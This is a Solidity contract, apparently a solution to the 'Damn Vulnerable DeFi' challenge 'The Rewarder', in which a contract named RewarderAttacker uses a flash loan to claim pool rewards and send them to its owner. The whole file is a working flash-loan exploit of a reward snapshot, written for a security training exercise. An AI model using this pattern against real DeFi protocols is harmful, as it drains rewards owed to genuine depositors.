// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { TheRewarderPool } from "./TheRewarderPool.sol";
import { FlashLoanerPool } from "./FlashLoanerPool.sol";
import { AccountingToken } from "./AccountingToken.sol";
import { RewardToken } from "./RewardToken.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract RewarderAttacker{
    TheRewarderPool theRewarderPool;
    FlashLoanerPool flashLoanerPool;
    AccountingToken accountingToken;
    address owner;

    constructor(address _rewarderPool, address _flashLoanerPool, address _accountingToken){
        theRewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        accountingToken = AccountingToken(_accountingToken);
        owner = msg.sender;
    }

    function attack() external{
        address liquidityTokenAddress = address(flashLoanerPool.liquidityToken());

        flashLoanerPool.flashLoan(DamnValuableToken(liquidityTokenAddress).balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        //retrieved liquidity token amount
        address rewardTokenAddress = address(theRewarderPool.rewardToken());
        address liquidityTokenAddress = address(flashLoanerPool.liquidityToken());

        //attack to get rewards
        DamnValuableToken(liquidityTokenAddress).approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.distributeRewards();

        //retrieved rewards
        theRewarderPool.withdraw(amount);

        //send the reward to owner
        uint256 rewards = RewardToken(rewardTokenAddress).balanceOf(address(this));
        SafeTransferLib.safeTransfer(rewardTokenAddress, owner, rewards);

        DamnValuableToken(liquidityTokenAddress).transfer(address(flashLoanerPool), amount);
    }
}